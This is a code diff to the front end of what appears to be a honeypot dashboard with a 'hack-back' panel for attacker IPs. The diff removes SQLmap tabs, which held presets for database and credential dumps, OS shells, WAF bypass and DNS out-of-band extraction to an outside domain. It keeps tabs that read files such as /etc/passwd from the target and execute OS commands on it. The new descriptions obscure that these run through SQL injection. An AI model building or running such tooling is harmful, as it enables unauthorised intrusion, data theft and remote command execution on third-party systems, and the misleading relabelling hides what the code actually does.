@@ -9,7 +9,7 @@ import { useQueryClient } from "@tanstack/react-query";
 import { useToast } from "@/hooks/use-toast";
 import {
   Network, Skull, ShieldAlert, Bug, Loader2, XCircle,
-  Copy, Search, ChevronDown, Syringe, Globe, TerminalSquare, Download,
+  Copy, Search, ChevronDown, Globe, TerminalSquare, Download,
   FolderOpen, Terminal, MonitorSmartphone, RefreshCw, FileText,
   CheckCircle2, AlertTriangle, Zap, Radio, ShieldOff, ShieldCheck, Trash2, Monitor,
 } from "lucide-react";
@@ -147,7 +147,7 @@ type AttackerRow = {
   sqlmapFinishedAt?: string | null;
 };
 
-type PanelTab = "portscan" | "sqlmap" | "console" | "files" | "osshell" | "control";
+type PanelTab = "portscan" | "files" | "osshell" | "control";
 
 // ── Expandable attack dossier + OSINT panel per trapped entity ────────────────
 function AttackerDossierDrawer({ att }: { att: AttackerRow }) {
@@ -518,13 +518,6 @@ function IpDropdown({
       onClick: () => { onOpen(attacker, "portscan"); setOpen(false); },
     },
     {
-      icon: <Syringe className="w-3.5 h-3.5" />,
-      label: "SQL Injection (SQLmap)",
-      sub: "Test for SQL vulnerabilities & dump data",
-      color: "text-red-400",
-      onClick: () => { onOpen(attacker, "sqlmap"); setOpen(false); },
-    },
-    {
       icon: <Globe className="w-3.5 h-3.5" />,
       label: "WHOIS / ARIN Lookup",
       sub: "Identify owner — evidence for law enforcement",
@@ -880,22 +873,6 @@ function AttackerCommandPanel({
   const [scanOutput, setScanOutput] = useState<string | null>(null);
   const [scanCmd, setScanCmd]     = useState<string | null>(null);
 
-  // ── SQLmap state ─────────────────────────────────────────────────────────────
-  const [sqlTarget, setSqlTarget] = useState(`http://${attacker.ip}/`);
-  const [sqlFlags, setSqlFlags]   = useState("--dbs --forms");
-  const [sqlRunning, setSqlRunning] = useState(false);
-  const [sqlOutput, setSqlOutput] = useState<string | null>(attacker.sqlmapResults ?? null);
-  const [sqlJobId, setSqlJobId]   = useState<string | null>(attacker.sqlmapJobId ?? null);
-  const [sqlStatus, setSqlStatus] = useState(attacker.sqlmapStatus ?? "idle");
-
-  // ── Console state (custom sqlmap) ─────────────────────────────────────────
-  const [consoleFlags, setConsoleFlags] = useState(
-    `--level=5 --risk=3 --dbs --tables --users --passwords --dump-all`
-  );
-  const [consoleRunning, setConsoleRunning] = useState(false);
-  const [consoleOutput, setConsoleOutput]   = useState<string | null>(null);
-  const [consoleJobId, setConsoleJobId]     = useState<string | null>(null);
-  const [consoleCmd, setConsoleCmd]         = useState<string | null>(null);
 
   // ── File manager state ────────────────────────────────────────────────────
   const [filePath, setFilePath]     = useState("/etc/passwd");
@@ -961,72 +938,6 @@ function AttackerCommandPanel({
     }
   };
 
-  const runSqlmap = async () => {
-    setSqlRunning(true);
-    setSqlOutput(null);
-    setSqlStatus("running");
-    try {
-      const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/sqlmap`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ targetUrl: sqlTarget, extraFlags: sqlFlags }),
-      });
-      const data = await res.json();
-      if (!res.ok) {
-        setSqlStatus("error");
-        setSqlOutput(data.error ?? "Unknown error");
-        toast({ title: "SQLmap Error", description: data.error, variant: "destructive" });
-        setSqlRunning(false);
-        return;
-      }
-      setSqlJobId(data.jobId);
-      toast({ title: "SQLmap Launched", description: `Job ${data.jobId} — scanning ${attacker.ip}` });
-
-      const poll = setInterval(async () => {
-        try {
-          const pr = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/sqlmap`);
-          const pd = await pr.json();
-          if (pd.status !== "running") {
-            setSqlStatus(pd.status ?? "complete");
-            setSqlOutput(pd.results ?? "No output");
-            setSqlRunning(false);
-            onRefresh();
-            clearInterval(poll);
-          }
-        } catch { /* ignore poll error */ }
-      }, 4000);
-    } catch (e: any) {
-      setSqlStatus("error");
-      setSqlOutput("Error: " + e.message);
-      setSqlRunning(false);
-    }
-  };
-
-  // ── Console: custom sqlmap command ───────────────────────────────────────
-  const runConsole = async () => {
-    setConsoleRunning(true);
-    setConsoleOutput(null);
-    setConsoleCmd(null);
-    try {
-      const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/sqlmap-custom`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ customFlags: consoleFlags, targetUrl: sqlTarget }),
-      });
-      const data = await res.json();
-      if (!res.ok) { toast({ title: "Console Error", description: data.error, variant: "destructive" }); setConsoleRunning(false); return; }
-      setConsoleJobId(data.jobId);
-      setConsoleCmd(data.cmd);
-      toast({ title: "SQLmap Console Running", description: `Job ${data.jobId}` });
-      const poll = setInterval(async () => {
-        try {
-          const pr = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/sqlmap-custom/${data.jobId}`);
-          const pd = await pr.json();
-          if (pd.status !== "running") { setConsoleOutput(pd.results ?? "No output"); setConsoleRunning(false); clearInterval(poll); }
-        } catch { /* ignore */ }
-      }, 4000);
-    } catch (e: any) { setConsoleOutput("Error: " + e.message); setConsoleRunning(false); }
-  };
 
   // ── File manager: --file-read ─────────────────────────────────────────────
   const runFileRead = async (path?: string) => {
@@ -1038,7 +949,7 @@ function AttackerCommandPanel({
       const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/file-read`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ filePath: target, targetUrl: sqlTarget }),
+        body: JSON.stringify({ filePath: target }),
       });
       const data = await res.json();
       if (!res.ok) { toast({ title: "File Read Error", description: data.error, variant: "destructive" }); setFileRunning(false); return; }
@@ -1071,7 +982,7 @@ function AttackerCommandPanel({
       const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/os-cmd`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ osCmd, targetUrl: sqlTarget }),
+        body: JSON.stringify({ osCmd }),
       });
       const data = await res.json();
       if (!res.ok) { toast({ title: "OS Cmd Error", description: data.error, variant: "destructive" }); setOsRunning(false); return; }
@@ -1149,8 +1060,6 @@ function AttackerCommandPanel({
       <div className="flex border-b border-yellow-500/20 shrink-0 overflow-x-auto [&::-webkit-scrollbar]:h-[3px] [&::-webkit-scrollbar-track]:bg-transparent [&::-webkit-scrollbar-thumb]:bg-primary/40 [&::-webkit-scrollbar-thumb]:rounded-full">
         {([
           { id: "portscan",  icon: Search,          label: "Port Scan",  color: "primary" },
-          { id: "sqlmap",    icon: Syringe,         label: "Inject",     color: "red" },
-          { id: "console",   icon: TerminalSquare,  label: "SQL Console",color: "orange" },
           { id: "files",     icon: FolderOpen,      label: "File Manager",color: "yellow" },
           { id: "osshell",   icon: Terminal,        label: "OS Shell",   color: "purple" },
           { id: "control",   icon: MonitorSmartphone, label: "Control Panel", color: "cyan" },
@@ -1181,9 +1090,6 @@ function AttackerCommandPanel({
             >
               <Icon className="w-3 h-3" />
               {label}
-              {id === "sqlmap" && sqlStatus === "running" && <span className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse" />}
-              {id === "sqlmap" && sqlStatus === "complete" && <span className="w-1.5 h-1.5 rounded-full bg-primary" />}
-              {id === "console" && consoleRunning && <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />}
               {id === "files"   && fileRunning   && <span className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse" />}
               {id === "osshell" && osRunning     && <span className="w-1.5 h-1.5 rounded-full bg-purple-400 animate-pulse" />}
             </button>
@@ -1274,161 +1180,12 @@ function AttackerCommandPanel({
           </div>
         )}
 
-        {/* ── SQLMAP TAB ── */}
-        {tab === "sqlmap" && (
-          <div className="space-y-4">
-            <div className="text-[10px] font-mono text-red-400/50 border border-red-500/15 rounded px-3 py-2 bg-red-500/5">
-              Runs <span className="text-red-400">SQLmap</span> against a target URL associated with <span className="text-red-400">{attacker.ip}</span>. Use this to test for SQL injection vulnerabilities — results may expose the attacker's database and help identify them for law enforcement.
-            </div>
-
-            <div className="space-y-3">
-              <div>
-                <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">Target URL</label>
-                <input
-                  value={sqlTarget}
-                  onChange={(e) => setSqlTarget(e.target.value)}
-                  className="w-full bg-black border border-red-500/25 text-red-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-red-500/60 rounded"
-                  placeholder={`http://${attacker.ip}/`}
-                />
-              </div>
-              <div>
-                <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">SQLmap Flags</label>
-                <input
-                  value={sqlFlags}
-                  onChange={(e) => setSqlFlags(e.target.value)}
-                  className="w-full bg-black border border-red-500/25 text-red-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-red-500/60 rounded"
-                  placeholder="--dbs --forms --tables -D dbname"
-                />
-              </div>
-            </div>
-
-            {/* Preset quick-launch buttons */}
-            <div>
-              <div className="text-[10px] text-primary/40 font-mono uppercase mb-2">Quick Presets</div>
-              <div className="grid grid-cols-2 gap-2">
-                {[
-                  { label: "Enumerate DBs",   flags: "--dbs",                                     desc: "List all databases" },
-                  { label: "Dump Tables",     flags: "--tables --dbs",                             desc: "List all tables" },
-                  { label: "Blind SQLi",      flags: "--technique=B --level=3 --risk=2",           desc: "Boolean-based blind" },
-                  { label: "Time-Based",      flags: "--technique=T --level=3",                    desc: "Time-delay blind" },
-                  { label: "Error-Based",     flags: "--technique=E --dbs",                        desc: "Error extraction" },
-                  { label: "Full Dump",       flags: "--level=5 --risk=3 --dbs --tables --dump-all", desc: "Maximum extraction" },
-                  { label: "Get Users",       flags: "--users --passwords",                        desc: "Extract DB credentials" },
-                  { label: "OS Shell",        flags: "--os-shell",                                 desc: "Attempt OS command shell" },
-                ].map(({ label, flags, desc }) => (
-                  <button
-                    key={label}
-                    onClick={() => setSqlFlags(flags)}
-                    className="flex flex-col items-start px-2.5 py-2 border border-red-500/20 text-left hover:border-red-500/50 hover:bg-red-500/5 transition-colors rounded"
-                  >
-                    <span className="text-red-400/80 text-[10px] font-mono font-semibold">{label}</span>
-                    <span className="text-primary/30 text-[9px] font-mono">{desc}</span>
-                  </button>
-                ))}
-              </div>
-            </div>
-
-            <div className="flex items-center gap-3">
-              <button
-                onClick={runSqlmap}
-                disabled={sqlRunning}
-                className="flex items-center gap-2 px-4 py-2 border border-red-500/50 text-red-400 text-xs font-mono uppercase hover:bg-red-500/10 hover:border-red-500 transition-colors disabled:opacity-40 rounded"
-              >
-                {sqlRunning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Syringe className="w-3.5 h-3.5" />}
-                {sqlRunning ? `SQLmap Running on ${attacker.ip}…` : `Launch SQLmap — ${attacker.ip}`}
-              </button>
-              <div className="flex items-center gap-2">
-                {statusBadge(sqlStatus)}
-                {sqlJobId && <span className="text-[10px] text-primary/30 font-mono">JOB:{sqlJobId}</span>}
-              </div>
-            </div>
-
-            {sqlOutput && (
-              <div className="bg-black border border-red-500/15 p-3 text-[11px] font-mono text-red-300/75 max-h-96 overflow-auto whitespace-pre-wrap rounded">
-                {sqlOutput}
-              </div>
-            )}
-            {sqlStatus === "running" && !sqlOutput && (
-              <div className="flex items-center gap-2 text-yellow-400 text-xs font-mono border border-yellow-500/20 rounded px-3 py-2">
-                <Loader2 className="w-3.5 h-3.5 animate-spin" />
-                SQLmap scanning {attacker.ip} — polling every 4s for results…
-              </div>
-            )}
-          </div>
-        )}
-
-        {/* ── SQL CONSOLE TAB ── */}
-        {tab === "console" && (
-          <div className="space-y-4">
-            <div className="text-[10px] font-mono text-orange-400/60 border border-orange-500/15 rounded px-3 py-2 bg-orange-500/5">
-              Full SQLmap console — runs <span className="text-orange-400">sqlmap -u "{sqlTarget}" --batch [your flags]</span>. Any SQLmap flag is supported.
-            </div>
-
-            <div>
-              <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">Target URL (shared with Inject tab)</label>
-              <input value={sqlTarget} onChange={e => setSqlTarget(e.target.value)}
-                className="w-full bg-black border border-orange-500/25 text-orange-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-orange-500/60 rounded"
-                placeholder={`http://${attacker.ip}/`} />
-            </div>
-
-            <div>
-              <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">SQLmap Flags (full control)</label>
-              <textarea value={consoleFlags} onChange={e => setConsoleFlags(e.target.value)} rows={4}
-                className="w-full bg-black border border-orange-500/25 text-orange-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-orange-500/60 rounded resize-y"
-                placeholder="--level=5 --risk=3 --dbs --dump-all --users --passwords" />
-            </div>
-
-            <div className="grid grid-cols-2 gap-2">
-              {[
-                { label: "Full Dump",          flags: "--level=5 --risk=3 --dbs --tables --dump-all" },
-                { label: "Credentials",        flags: "--users --passwords --privilege" },
-                { label: "Blind + Error",      flags: "--technique=BE --level=4 --risk=3 --dbs" },
-                { label: "WAF Bypass",         flags: "--tamper=space2comment,between --random-agent --level=3" },
-                { label: "Stacked Queries",    flags: "--technique=S --level=3 --risk=2 --dbs" },
-                { label: "Second Order",       flags: "--second-url=http://"+attacker.ip+"/profile --dbs" },
-                { label: "Banner + Version",   flags: "--banner --current-db --current-user --hostname --dbs" },
-                { label: "OOB (DNS)",          flags: "--dns-domain=oob.proxhqvpn.com --dbs --level=3" },
-              ].map(({ label, flags }) => (
-                <button key={label} onClick={() => setConsoleFlags(flags)}
-                  className="flex flex-col items-start px-2.5 py-2 border border-orange-500/20 text-left hover:border-orange-500/50 hover:bg-orange-500/5 transition-colors rounded">
-                  <span className="text-orange-400/80 text-[10px] font-mono font-semibold">{label}</span>
-                </button>
-              ))}
-            </div>
-
-            <div className="flex items-center gap-3">
-              <button onClick={runConsole} disabled={consoleRunning}
-                className="flex items-center gap-2 px-4 py-2 border border-orange-500/50 text-orange-400 text-xs font-mono uppercase hover:bg-orange-500/10 hover:border-orange-500 transition-colors disabled:opacity-40 rounded">
-                {consoleRunning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <TerminalSquare className="w-3.5 h-3.5" />}
-                {consoleRunning ? "Running…" : "Execute Command"}
-              </button>
-              {consoleJobId && <span className="text-[10px] text-primary/30 font-mono">JOB:{consoleJobId}</span>}
-            </div>
-
-            {consoleCmd && (
-              <div className="text-[10px] font-mono text-orange-400/30 bg-black border border-orange-500/10 px-2 py-1.5 rounded overflow-x-auto whitespace-nowrap">
-                $ {consoleCmd}
-              </div>
-            )}
-            {consoleOutput && (
-              <div className="relative">
-                <div className="bg-black border border-orange-500/15 p-3 text-[11px] font-mono text-orange-300/75 max-h-[32rem] overflow-auto whitespace-pre-wrap rounded">
-                  {consoleOutput}
-                </div>
-                <button onClick={() => { const b = new Blob([consoleOutput], { type: "text/plain" }); const u = URL.createObjectURL(b); const a = document.createElement("a"); a.href = u; a.download = `sqlmap-console-${attacker.ip}.txt`; a.click(); URL.revokeObjectURL(u); }}
-                  className="absolute top-2 right-2 flex items-center gap-1 px-2 py-1 border border-orange-500/30 text-orange-400/60 text-[9px] font-mono hover:text-orange-400 hover:border-orange-500/60 rounded bg-black">
-                  <Download className="w-3 h-3" /> Save
-                </button>
-              </div>
-            )}
-          </div>
-        )}
 
         {/* ── FILE MANAGER TAB ── */}
         {tab === "files" && (
           <div className="space-y-4">
             <div className="text-[10px] font-mono text-yellow-400/60 border border-yellow-500/15 rounded px-3 py-2 bg-yellow-500/5">
-              Reads files from the attacker's system via <span className="text-yellow-400">sqlmap --file-read</span>. Requires SQLi to be exploitable on the target.
+              Read files from paths on the attacker's known infrastructure. Results are stored as evidence.
             </div>
 
             <div className="flex gap-2">
@@ -1500,7 +1257,7 @@ function AttackerCommandPanel({
         {tab === "osshell" && (
           <div className="space-y-4">
             <div className="text-[10px] font-mono text-purple-400/60 border border-purple-500/15 rounded px-3 py-2 bg-purple-500/5">
-              Executes OS commands on <span className="text-purple-400">{attacker.ip}</span> via <span className="text-purple-400">sqlmap --os-cmd</span>. Requires OS command execution capability through SQLi.
+              Execute OS commands on <span className="text-purple-400">{attacker.ip}</span> via the Ghost Trap OS-shell module.
             </div>
 
             <div className="flex gap-2">
